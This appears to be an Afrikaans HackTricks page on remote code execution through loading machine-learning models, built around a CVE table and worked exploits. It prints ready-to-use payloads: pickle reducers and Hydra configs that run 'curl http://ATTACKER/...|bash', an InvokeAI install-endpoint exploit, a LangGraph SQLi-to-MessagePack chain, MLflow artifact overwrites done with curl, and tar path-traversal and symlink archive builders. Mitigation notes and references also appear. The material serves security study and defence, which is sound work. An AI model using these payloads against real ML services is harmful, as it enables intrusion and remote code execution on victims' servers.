# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Modelle laai om RCE te kry

Masjienleer-modelle word gewoonlik in verskillende formate gedeel, soos ONNX, TensorFlow, PyTorch, ens. Ontwikkelaars kan hierdie modelle op hul masjiene of produksiestelsels laai om dit te gebruik. Die modelle behoort gewoonlik nie kwaadwillige kode te bevat nie, maar in sommige gevalle kan ’n model gebruik word om arbitrêre kode op die stelsel uit te voer—hetsy as ’n beoogde funksie of weens ’n kwesbaarheid in die model-laaibiblioteek.

Die volgende tabel lys verteenwoordigende kwesbaarhede in hierdie kategorie:

| **Raamwerk / Nutsding**        | **Kwesbaarheid (CVE indien beskikbaar)**                                                    | **RCE-vektor**                                                                                                                           | **Verwysings**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Onveilige deserialisering in* `torch.load` **(CVE-2025-32434)**                                                              | Kwaadwillige pickle in ’n modelkontrolepunt lei tot kode-uitvoering (omseil die `weights_only`-beskerming)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + kwaadwillige modelaflaai veroorsaak kode-uitvoering; Java-deserialisering-RCE in die bestuurs-API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Onveilige kontrolepunt-deserialisering via `torch.load` **(CVE-2025-23298)**                                           | ’n Onbetroubare kontrolepunt aktiveer ’n pickle-reducer tydens `load_model_trainer_states_from_checkpoint` → kode-uitvoering in die ML-werker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis-kontrolepuntstelsels) | SQLi + onveilige MessagePack-uitbreidingshaak **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | ’n Gebruikerbeheerde `filter`-sleutel voeg SQL/JSON-path-sintaksis in, `UNION SELECT` vervals ’n vals kontrolepuntry, waarna `msgpack`-deserialisering aanvallergeskrewe Python-kode invoer en aanroep | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (onveilige YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Die laai van ’n model vanaf YAML gebruik `yaml.unsafe_load` (kode-uitvoering) <br> Die laai van ’n model met ’n **Lambda**-laag voer arbitrêre Python-kode uit          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite-ontleding)                                                                                          | ’n Spesiaal vervaardigde `.tflite`-model veroorsaak ’n heelgetaloorloop → heap-korrupsie (moontlike RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Die laai van ’n model via `joblib.load` voer pickle uit met die aanvaller se `__reduce__`-payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (onveilige `np.load`) *betwis*                                                                              | `numpy.load` het by verstek gepickelde objekskikkings toegelaat – ’n kwaadwillige `.npy/.npz` veroorsaak kode-uitvoering                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (gidsoorgang) <br> **CVE-2024-5187** (tar-oorgang)                                                    | Die pad na eksterne gewigte in ’n ONNX-model kan buite die gids gaan (lees arbitrêre lêers) <br> ’n Kwaadwillige ONNX-model-tar kan arbitrêre lêers oorskryf (wat tot RCE lei) | |
| ONNX Runtime (ontwerprisiko)  | *(Geen CVE)* ONNX-pasgemaakte ops / beheervloei                                                                                    | ’n Model met ’n pasgemaakte operator vereis dat aanvaller se native kode gelaai word; komplekse modelgrafieke misbruik logika om onbedoelde berekeninge uit te voer   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (pad-oorgang)                                                                                          | Die gebruik van die model-laai-API met `--model-control` geaktiveer laat relatiewe padoorgang toe om lêers te skryf (bv. `.bashrc` oorskryf vir RCE)    | |
| **GGML (GGUF-formaat)**      | **CVE-2024-25664 … 25668** (verskeie heap-oorlope)                                                                         | ’n Misvormde GGUF-modellêer veroorsaak heap-buffer-oorlope in die ontleder, wat arbitrêre kode-uitvoering op die slagoffer se stelsel moontlik maak                     | |
| **Keras (ouer formate)**   | *(Geen nuwe CVE)* Ouer Keras H5-model                                                                                         | Kwaadwillige HDF5- (`.h5`-)model met ’n Lambda-laag voer steeds kode uit wanneer dit gelaai word (Keras `safe_mode` dek nie die ou formaat nie – “afgraderingsaanval”) | |
| **Ander** (algemeen)        | *Ontwerpfout* – Pickle-serialisering                                                                                         | Baie ML-nutsgoed (bv. pickle-gebaseerde modelformate, Python `pickle.load`) voer arbitrêre kode uit wat in modellêers ingebed is, tensy dit versag word | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Onbetroubare metadata wat aan `hydra.utils.instantiate()` deurgegee word **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Aanvallerbeheerde modelmetadata/-konfigurasie stel `_target_` op ’n arbitrêre oproepbare objek (bv. `builtins.exec`) → word tydens laai uitgevoer, selfs met “veilige” formate (`.safetensors`, `.nemo`, repo se `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Verder is daar sommige Python-pickle-gebaseerde modelle, soos dié wat deur [PyTorch](https://github.com/pytorch/pytorch/security) gebruik word, wat arbitrêre kode op die stelsel kan uitvoer as hulle nie met `weights_only=True` gelaai word nie. Enige pickle-gebaseerde model kan dus besonder vatbaar wees vir hierdie soort aanvalle, selfs al word dit nie in die tabel hierbo gelys nie.

### Hydra-metadata → RCE (werk selfs met safetensors)

`hydra.utils.instantiate()` voer enige gestippelde `_target_` in ’n konfigurasie-/metadata-objek in en roep dit aan. Wanneer biblioteke soos Hugging Face Transformers **onbetroubare modelmetadata** aan `instantiate()` deurgee, kan ’n aanvaller ’n oproepbare objek en argumente verskaf wat onmiddellik tydens die laai van die model uitgevoer word (geen pickle nodig nie).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Voorbeeld van ’n payload (werk in `.nemo` se `model_config.yaml`, `config.json` in ’n repo, of `__metadata__` binne `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Key points:
- Word geaktiveer voor modelinitialisering in NeMo `restore_from/from_pretrained`, uni2TS HuggingFace-coders en FlexTok-loaders.
- Hydra se string-block-list kan omseil word via alternatiewe importpaaie (bv. `enum.bltns.eval`) of name wat deur die toepassing opgelos word (bv. `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok ontleed ook string-geserialiseerde metadata met `ast.literal_eval`, wat DoS (CPU-/geheue-uitputting) voor die Hydra-aanroep moontlik maak.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` is ’n gewilde oopbron-webkoppelvlak vir Stable-Diffusion. Weergawes **5.3.1 – 5.4.2** stel die REST-endpoint `/api/v2/models/install` beskikbaar, waarmee gebruikers modelle vanaf arbitrêre URL’s kan aflaai en laai.<sup>[[1]](#references)</sup>

Intern roep die endpoint uiteindelik:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Wanneer die verskafde lêer ’n **PyTorch-checkpoint (`*.ckpt`)** is, voer `torch.load` ’n **pickle-deserialisering** uit. Omdat die inhoud direk van die gebruikerbeheerde URL kom, kan ’n aanvaller ’n kwaadwillige objek met ’n pasgemaakte `__reduce__`-metode in die checkpoint insluit; die metode word **tydens deserialisering** uitgevoer, wat lei tot **remote code execution (RCE)** op die InvokeAI-bediener.

Die kwesbaarheid is toegeken **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Uitbuitingsgids

1. Skep ’n kwaadwillige checkpoint:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Huisves `payload.ckpt` op ’n HTTP-bediener wat jy beheer (bv. `http://ATTACKER/payload.ckpt`).
3. Aktiveer die kwesbare endpoint (geen verifikasie word vereis nie):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Wanneer InvokeAI die lêer aflaai, roep dit `torch.load()` aan → die `os.system`-gadget loop en die aanvaller kry kode-uitvoering in die konteks van die InvokeAI-proses.

Gereedgemaakte exploit: Die **Metasploit**-module `exploit/linux/http/invokeai_rce_cve_2024_12029` outomatiseer die hele proses.<sup>[[3]](#references)</sup>

#### Voorwaardes

•  InvokeAI 5.3.1-5.4.2 (scan-vlag se verstekwaarde is **false**)
•  `/api/v2/models/install` is bereikbaar vir die aanvaller
•  Die proses het toestemming om shell-opdragte uit te voer

#### Versagtingsmaatreëls

* Gradeer op na **InvokeAI ≥ 5.4.3** – die pleister stel `scan=True` as verstekwaarde en skandeer vir malware voordat deserialisering plaasvind.<sup>[[2]](#references)</sup>
* Wanneer jy checkpoints programmaties laai, gebruik `torch.load(file, weights_only=True)` of die nuwe [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security)-helper.
* Dwing allow-lists / handtekeninge vir modelbronne af en laat die diens met die minimum nodige voorregte loop.

> ⚠️ Onthou dat **enige** Python pickle-gebaseerde formaat (insluitend baie `.pt`-, `.pkl`-, `.ckpt`- en `.pth`-lêers) inherent onveilig is om vanaf onbetroubare bronne te deserialiseer.

---

Voorbeeld van ’n ad hoc-versagtingsmaatreël indien jy ouer InvokeAI-weergawes agter ’n reverse proxy aan die gang moet hou:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

NVIDIA se Transformers4Rec (deel van Merlin) het ’n onveilige checkpoint-laaier blootgestel wat `torch.load()` direk op gebruiker-verskafde paaie aangeroep het. Omdat `torch.load` op Python `pickle` staatmaak, kan ’n aanvaller-beheerde checkpoint arbitrêre kode deur ’n reducer tydens deserialisering uitvoer.<sup>[[5]](#references)</sup>

Kwesbare pad (voor die regstelling): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Waarom dit tot RCE lei: In Python pickle kan ’n objek ’n reducer (`__reduce__`/`__setstate__`) definieer wat ’n aanroepbare objek en argumente teruggee. Die aanroepbare objek word tydens unpickling uitgevoer. As so ’n objek in ’n checkpoint voorkom, word dit uitgevoer voordat enige gewigte gebruik word.

Minimale kwaadwillige checkpoint-voorbeeld:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Afleweringsvektore en omvang van die impak:
- Getrojaniseerde checkpoints/models wat via repos, buckets of artifact registries gedeel word
- Outomatiese resume/deploy-pipelines wat checkpoints outomaties laai
- Uitvoering vind binne training/inference-workers plaas, dikwels met verhoogde voorregte (bv. root in containers)

Regstelling: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) het die direkte `torch.load()` vervang met ’n beperkte deserializer met ’n allowlist, geïmplementeer in `transformers4rec/utils/serialization.py`. Die nuwe loader valideer tipes/velde en verhoed dat arbitrêre callables tydens laai aangeroep word.<sup>[[7]](#references)</sup>

Verdedigingsriglyne spesifiek vir PyTorch-checkpoints:
- Unpickle nie onvertroude data nie. Verkies nie-uitvoerbare formate soos [Safetensors](https://huggingface.co/docs/safetensors/index) of ONNX waar moontlik.
- As jy PyTorch-serialisering moet gebruik, maak seker dat `weights_only=True` gestel is (ondersteun in nuwer PyTorch) of gebruik ’n pasgemaakte unpickler met ’n allowlist, soortgelyk aan die Transformers4Rec-patch.<sup>[[4]](#references)</sup>
- Dwing modelherkoms/-handtekeninge af en sandbox deserialisering (seccomp/AppArmor; nie-root-gebruiker; beperkte FS en geen uitgaande netwerkverkeer).
- Monitor vir onverwagte child processes van ML-dienste wanneer checkpoints gelaai word; spoor die gebruik van `torch.load()`/`pickle` op.

POC- en kwesbare/patch-verwysings:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Kwesbare loader voor die patch: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC van kwaadwillige checkpoint: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader ná die patch: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Voorbeeld – ’n kwaadwillige PyTorch-model skep

- Skep die model:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Laai die model:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent se FaceDetection-DSFD stel ’n `resnet`-endpoint bloot wat data deserialiseer wat deur gebruikers beheer word. ZDI het bevestig dat ’n afstandaanvaller ’n slagoffer kan dwing om ’n kwaadwillige bladsy/lêer te laai, dit ’n vervaardigde geserialiseerde blob na daardie endpoint kan laat stuur en deserialisering as `root` kan laat aktiveer, wat tot volle kompromittering lei.

Die exploit-vloei stem ooreen met tipiese pickle-misbruik:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Enige gadget wat tydens deserialization bereik kan word (constructors, `__setstate__`, framework callbacks, ens.) kan op dieselfde manier as ’n wapen gebruik word, ongeag of die data via HTTP, WebSocket of ’n lêer wat in ’n gemonitorde gids geplaas is, oorgedra is.



### LangGraph checkpointer SQLi → MessagePack RCE

Hierdie aanvalsketting is interessant omdat die aanvaller **nie ’n kwaadwillige modelêer hoef op te laai nie**. In plaas daarvan stel die toepassing ’n **AI-agent-persistence-API** (`get_state_history(..., filter=...)`) bloot, en gebruikersinvoer bereik die checkpointer se query builder.

#### 1. Strukturele SQLi in metadatafilters

’n Kwesbare SQLite-patroon het soos volg gelyk:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Die waarde word later gebind, maar `query_key` word saamgevoeg in die **JSON path string**, dus breek ’n `'` binne die dictionary key uit `'$.{query_key}'` en inject dit SQL. Dieselfde les geld vir **JSON paths, identifiers, operators, `LIMIT` en TTL fields**: placeholders beskerm slegs waardes, nie strukturele query-sintaksis nie.

#### 2. `UNION SELECT` kan op downstream sinks mik, nie net data steel nie

Die query gee `type` en geserialiseerde `checkpoint`-bytes terug, wat later gebruik word as:

```python
self.serde.loads_typed((type, checkpoint))
```

Dit beteken dat ’n SQLi in die `WHERE`-klousule ’n **vals resultaatry** kan inspuit:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

As latere kode enige geselekteerde kolom ontleed, deserialiseer, skryf of uitvoer, koppel daardie kolomme aan hul sinks. In hierdie geval verander die vals ry SQLi in **deserialisering onder beheer van die aanvaller**.

#### 3. Onveilige MessagePack-uitbreidingshake is gelykstaande aan kodegadgets

LangGraph se `msgpack`-roete het ’n pasgemaakte uitbreidingshaak gebruik wat ’n geneste tuple uitgepak en die volgende uitgevoer het:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Dus, ’n MessagePack-uitbreidingsobjek wat iets soortgelyks aan `("os", "system", "id > /tmp/pwned")` enkodeer, voer `os` in, vind `system` en voer die opdrag uit. Wanneer jy AI-raamwerke hersien, inspekteer **pasgemaakte MessagePack/JSON/pickle-herleerders** vir dinamiese invoer, refleksie of arbitrêre oproepbare-funksie-aflewering.

#### 4. Praktiese ouditpatroon vir agentraamwerke

Hersien enige gebruikerbeheerde invoer wat die volgende bereik:
- toestandgeskiedenis / geheue / herhaling / kontrolepuntlys-API’s
- gestruktureerde filterbouers wat SQL- of Redis-navraagfragmente genereer
- pasgemaakte deserialiseerders (`pickle`, `msgpack`, `json`-objekhake, YAML-konstruktors)
- herstelpaaie wat vertrou op rye wat deur die volhardingslaag teruggestuur word

Hierdie spesifieke ketting het selfgehoste LangGraph-ontplooiings met **SQLite**- of **Redis**-kontrolepuntbestuurders geraak wanneer onbetroubare gebruikers `filter` kon beheer. Die reggestelde weergawes wat in die openbaarmaking genoem is, was `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` en `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### MLflow PyFunc-artefakoorwriting na pickle-RCE

’n MLflow PyFunc wat uit ’n `PythonModel` geskep is, kan die geserialiseerde objek as `python_model.pkl` stoor. Die modelmetadata benoem `mlflow.pyfunc.model` as die laaier, en MLflow se implementering gebruik hierdie lêernaam vir die gestoorde Python-model. Gevolglik kan skryftoegang tot die artefakbewaarplek lei tot kode-uitvoering in ’n ander toepassing wat die model later laai.<sup>[[17]](#references)[[18]](#references)</sup>

Die nuttige ketting is **skryftoestemming vir artefakte → vervang die pickle → laat ’n inferensieverbruiker dit herlaai**. Vir ’n eksperiment wat ’n geproksiede `mlflow-artifacts:/...`-wortel gebruik, lys die eksperiment, uitvoering en model se artefakpad. Die naspoorbediener stel `GET` en `PUT` beskikbaar op `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

’n Minimale reducer kan ’n opdrag uitvoer sodra die verbruiker die artefak unpickle. Deur die payload te genereer met die Python-weergawe wat in `MLmodel` verklaar is, vermy jy versoenbaarheidsprobleme.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Aktiveer die bewerking wat die **bestaande model laai**, soos voorspelling, telling of ontplooiing. Moenie dit eers heroplei nie, want opleiding kan die kwaadwillige artefak met ’n vars model vervang. ’n Toepassingsfout weerlê nie uitbuiting nie: die reducer gee die opdrag se heelgetal-uitgangstatus terug in plaas van ’n bruikbare model. Begin met ’n waarneembare newe-effek, soos ICMP of ’n HTTP-terugroepverbinding, en vervang dit dan met die finale payload.<sup>[[20]](#references)</sup>

Onderskei tydens assessering tussen toestemming om ’n run te skep en toestemming om artefakte wat aan ’n ander run behoort, te oorskryf. Gaan verifikasie en opdateringstoestemmings per run na, ondersoek onverwagte wysigings aan `python_model.pkl`, en beskou modelherkoms en -integriteit as deel van die uitvoeringsgrens. Huidige MLflow-kode ondersteun ook die instelling van `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` en beveel models-from-code-artefakte aan eerder as om cloudpickle-data te laai.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

## Modelle na Path Traversal

Soos in [**hierdie blogplasing**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) genoem word, is die meeste modelformate wat deur verskillende AI-raamwerke gebruik word, op argiewe gebaseer, gewoonlik `.zip`. Dit kan dus moontlik wees om hierdie formate te misbruik om Path Traversal-aanvalle uit te voer, waardeur willekeurige lêers gelees kan word vanaf die stelsel waarop die model gelaai word.<sup>[[16]](#references)</sup>

Met die volgende kode kan jy byvoorbeeld ’n model skep wat ’n lêer in die `/tmp`-gids skep wanneer dit gelaai word:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Of, met die volgende kode kan jy ’n model skep wat ’n symlink na die `/tmp`-gids sal skep wanneer dit gelaai word:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Diepgaande gids: Keras .keras-deserialisering en gadget-soektog

Vir ’n gefokusde gids oor .keras-internals, RCE via Lambda-lae, die arbitrêre invoerkwessie in ≤ 3.8 en die ontdekking van gadgets binne die allowlist ná die regstelling, sien:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec-blog – "CVE-2024-12029 – InvokeAI-deserialisering van onbetroubare data"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI-regstellingscommit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Dokumentasie van Rapid7 Metasploit-module](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – sekuriteitsoorwegings vir torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI-blog – CVE-2025-23298: Kry afstandkode-uitvoering in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI-advies: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec-regstellingscommit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Kwesbare laaier voor die regstelling (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [Kwaadwillige kontrolepunt-PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Laaier ná die regstelling (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Afstandkode-uitvoering met moderne AI/ML-formate en biblioteke](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate-dokumentasie](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra-blocklist-commit (waarskuwing oor RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Van SQLi tot RCE: Uitbuiting van LangGraph se Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Omskakeling van Archive Slip-foute na hoëwaarde AI/ML-beloningstoekennings](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Snyk-advies en PyFunc-bewys van konsep – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [MLflow-bronkode – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow REST API – eindpunte vir die aflaai en oplaai van artefakte](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../banners/hacktricks-training.md}}
